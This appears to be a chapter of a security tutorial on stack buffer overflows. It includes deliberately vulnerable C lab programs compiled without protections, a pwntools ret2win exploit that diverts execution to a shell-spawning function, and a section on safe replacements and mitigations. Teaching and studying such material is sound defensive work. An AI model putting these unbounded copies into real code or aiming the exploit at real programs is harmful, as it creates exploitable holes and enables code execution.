# Chapter 2 — Stack Buffer Overflows

> The original, canonical memory-corruption bug ("Smashing the Stack for Fun and
> Profit", Aleph One, 1996). Master this and every other bug is a variation.

---

## 2.1 What it is

A **buffer overflow** happens when a program writes **more data into a buffer
than the buffer can hold**, so the write spills into *adjacent* memory. When the
buffer is a **local variable on the stack**, the adjacent memory includes the
saved frame pointer and — crucially — the **function's return address**.

Overwrite the return address, and when the function executes `ret`, the CPU
jumps wherever you told it to.

---

## 2.2 Why it happens

Because C functions like `gets`, `strcpy`, `strcat`, `sprintf`, and `scanf("%s")`
copy bytes **until they hit a terminator**, with **no idea how big the
destination is**. The buffer's size lives only in the programmer's head; the copy
loop never checks it.

```c
char buf[16];
gets(buf);   // reads an entire line, however long, into a 16-byte buffer
```

If the user types 100 bytes, 84 of them land *past* `buf`.

---

## 2.3 How it happens — annotated

```c
// vuln1.c  — compile insecurely (see README lab setup)
#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buf[16];              // 16-byte buffer on the stack
    strcpy(buf, input);        // NO length check — the bug
    printf("You entered: %s\n", buf);
}

int main(int argc, char **argv) {
    if (argc > 1) vulnerable(argv[1]);
    return 0;
}
```

The stack frame of `vulnerable` (high addresses at top):

```
  +---------------------------+
  |   return address (8 bytes)|  <- ret jumps here
  +---------------------------+
  |   saved RBP     (8 bytes) |
  +---------------------------+  <- RBP
  |   buf[8..15]              |
  |   buf[0..7]               |  <- strcpy starts writing here, upward
  +---------------------------+  <- RSP
```

To reach the return address you must fill:

```
16 bytes (buf)  +  8 bytes (saved RBP)  = 24 bytes of padding,
then the next 8 bytes land on the RETURN ADDRESS.
```

```bash
gcc -g -O0 -fno-stack-protector -no-pie vuln1.c -o vuln1

./vuln1 AAAA                       # fine
./vuln1 $(python3 -c 'print("A"*16)')   # fills buf, still ok
./vuln1 $(python3 -c 'print("A"*40)')   # overruns -> Segmentation fault
```

The crash is the smoking gun: you overwrote the return address with `0x4141...`
(`"AAAA"`), `ret` jumped to `0x4141414141414141`, which is unmapped → SIGSEGV.

### Finding the exact offset

Guessing is slow. Use a **cyclic (De Bruijn) pattern** so each 8-byte window is
unique, then read which bytes landed in `rip`:

```bash
# with pwntools
python3 -c 'from pwn import *; print(cyclic(100).decode())'
# run in gdb, let it crash, then:   cyclic -l <value-in-rip>
```

GEF/pwndbg can do this automatically (`pattern create 100`, `pattern search`).

---

## 2.4 What an attacker does with it

Controlling the return address means controlling `rip`. Historically three stages
of escalation:

1. **Crash / DoS.** Just overwriting with junk crashes the program.
2. **Redirect to an existing function.** Overwrite the return address with the
   address of some interesting function already in the binary — e.g. a hidden
   `win()` / `give_shell()` function. This is the classic CTF "ret2win".
3. **Inject & run shellcode** (only works with an executable stack, `-z
   execstack`): put machine code in the buffer, overwrite the return address to
   point back into the buffer. On modern systems **NX** (Chapter 6) kills this,
   which is why **ret2libc** and **ROP** were invented.

### Test case: ret2win (control flow to a hidden function)

```c
// vuln2.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win(void) {                       // never called in normal flow
    puts("[win] you redirected execution!");
    system("/bin/sh");
}
void vuln(void) {
    char buf[32];
    gets(buf);                         // overflow here
}
int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    puts("send your input:");
    vuln();
    puts("normal return");
    return 0;
}
```

```bash
gcc -g -O0 -fno-stack-protector -no-pie vuln2.c -o vuln2
objdump -d vuln2 | grep '<win>:'       # find win()'s address, e.g. 0x401162
```

Exploit with pwntools (education: offset = 32 buf + 8 saved rbp = 40):

```python
# exploit2.py
from pwn import *
elf = ELF('./vuln2')
p   = process('./vuln2')
payload  = b'A' * 40           # fill buf + saved rbp
payload += p64(elf.sym['win']) # overwrite return address with win()
p.sendline(payload)
p.interactive()                # you get a shell IF win() calls system
```

On a 64-bit system you sometimes also need a `ret` gadget before `win` to fix
stack 16-byte alignment (`movaps` in libc faults otherwise) — pwntools'
`ROP(elf)` handles that detail. That nuance is itself a good lesson in how real
the calling-convention rules are.

---

## 2.5 Multiple test cases (variants you'll meet)

### (a) Overwriting an adjacent variable (no return address needed)

You don't always need `rip`. Sometimes clobbering a neighboring local is enough:

```c
// authbug.c
#include <stdio.h>
#include <string.h>
int main(void) {
    char pass[16];
    int authed = 0;            // sits adjacent to pass on the stack
    printf("password: ");
    gets(pass);                // overflow flips `authed`
    if (authed) puts("ACCESS GRANTED (you overflowed into authed!)");
    else        puts("denied");
    return 0;
}
```

Typing 17+ non-zero bytes can set `authed` to non-zero → logic bypass with no
`rip` control at all. (Exact layout depends on the compiler; the *lesson* —
overflow corrupts neighbors — is the point.)

### (b) Off-by-one / fencepost

```c
char buf[16];
for (int i = 0; i <= 16; i++) buf[i] = c;   // <= writes buf[16] — 1 byte past
```

A single-byte overflow seems harmless but can overwrite the **low byte of the
saved RBP** ("off-by-one frame pointer overwrite") and pivot the stack — a real,
exploitable class.

### (c) `scanf`, `strcat`, `sprintf` — same family

```c
char buf[8];
scanf("%s", buf);                 // unbounded, same bug as gets
sprintf(buf, "Hello %s", name);   // unbounded format expansion
strcat(buf, suffix);              // appends with no size check
```

### (d) Overflow of a loop bound read from input

```c
char buf[64]; int n;
scanf("%d", &n);
for (int i = 0; i < n; i++) buf[i] = getchar();  // attacker controls n
```

Attacker-controlled length is the most common real-world shape of this bug.

---

## 2.6 Impact

- **Arbitrary code execution** (worst case) — full control of the process.
- **Privilege escalation** if the program is setuid-root or a network daemon.
- **Authentication/logic bypass** (variant a).
- **Denial of service** (crashes).

Historic examples: the **Morris Worm (1988)** used a `gets` overflow in
`fingerd`; **Code Red / SQL Slammer** worms; countless CVEs still today.

---

## 2.7 The fix

**Always bound the copy to the destination size.**

```c
// Safe rewrite of vuln1.c
#include <stdio.h>
#include <string.h>

void safe(const char *input) {
    char buf[16];
    // snprintf always NUL-terminates and never writes past size:
    snprintf(buf, sizeof buf, "%s", input);
    printf("You entered: %s\n", buf);
}
```

Rules of thumb:

| Dangerous | Safe replacement |
|-----------|------------------|
| `gets(buf)` | `fgets(buf, sizeof buf, stdin)` |
| `strcpy(d,s)` | `snprintf(d, sizeof d, "%s", s)` or `strlcpy` (BSD) |
| `strcat(d,s)` | `snprintf`/`strlcat` with remaining-size math |
| `sprintf(d,...)` | `snprintf(d, sizeof d, ...)` |
| `scanf("%s", b)` | `scanf("%31s", b)` (field width = size-1) |

Additional defenses, layered (Chapter 6 details each):

- **Stack canaries** (`-fstack-protector-strong`) — detect the overwrite before
  `ret`.
- **NX/DEP** — stack not executable, kills injected shellcode.
- **ASLR + PIE** — randomize addresses so the attacker can't predict targets.
- **FORTIFY_SOURCE** (`-D_FORTIFY_SOURCE=2 -O2`) — compiler adds bounds checks to
  known-size `memcpy`/`strcpy`.
- Use **memory-safe languages** (Rust) for new code where you can.
- **Fuzzing + ASan** (Chapter 8) finds these automatically.

---

## Chapter 2 recap

- Writing past a stack buffer overwrites **saved RBP** and the **return
  address**; `ret` then jumps to attacker-chosen code.
- Offset = `sizeof(buf)` + alignment + `8` (saved rbp) to reach the saved rip;
  find it with a cyclic pattern.
- Escalation ladder: crash → ret2win → shellcode → (NX forces) ret2libc/ROP.
- Fix by **bounding every copy** and enabling canaries/NX/ASLR/FORTIFY.

Next: the heap works completely differently — allocator metadata becomes the
target. **[Chapter 3: The heap & dynamic memory »](03-heap-and-dynamic-memory.md)**
